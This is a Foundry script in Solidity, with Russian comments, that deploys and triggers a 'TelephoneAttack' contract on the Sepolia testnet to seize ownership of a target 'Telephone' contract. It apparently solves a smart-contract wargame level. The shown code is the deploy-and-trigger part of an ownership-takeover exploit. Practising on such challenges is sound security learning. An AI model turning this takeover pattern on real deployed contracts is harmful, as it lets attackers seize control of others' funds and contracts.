// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Script, console2} from "forge-std/Script.sol";
import {TelephoneAttack, ITelephone} from "../src/Telephone.sol";

// 1) один раз: forge script script/Telephone.s.sol:Deploy --rpc-url $SEPOLIA_RPC_URL --broadcast --private-key $PRIVATE_KEY
contract Deploy is Script {
    function run() external {
        address target = vm.envAddress("TELEPHONE_ADDRESS");

        vm.startBroadcast();
        TelephoneAttack attacker = new TelephoneAttack(target);
        vm.stopBroadcast();

        console2.log("Attacker deployed at:", address(attacker));
        console2.log("=> put this into TELEPHONE_ATTACKER_ADDRESS in .env");
    }
}

// 2) один вызов: forge script script/Telephone.s.sol:Attack --rpc-url $SEPOLIA_RPC_URL --broadcast --private-key $PRIVATE_KEY
contract Attack is Script {
    function run() external {
        address attackerAddr = vm.envAddress("TELEPHONE_ATTACKER_ADDRESS");
        address target = vm.envAddress("TELEPHONE_ADDRESS");

        TelephoneAttack attacker = TelephoneAttack(attackerAddr);

        vm.startBroadcast();
        attacker.attack();
        vm.stopBroadcast();

        console2.log("new owner:", ITelephone(target).owner());
    }
}
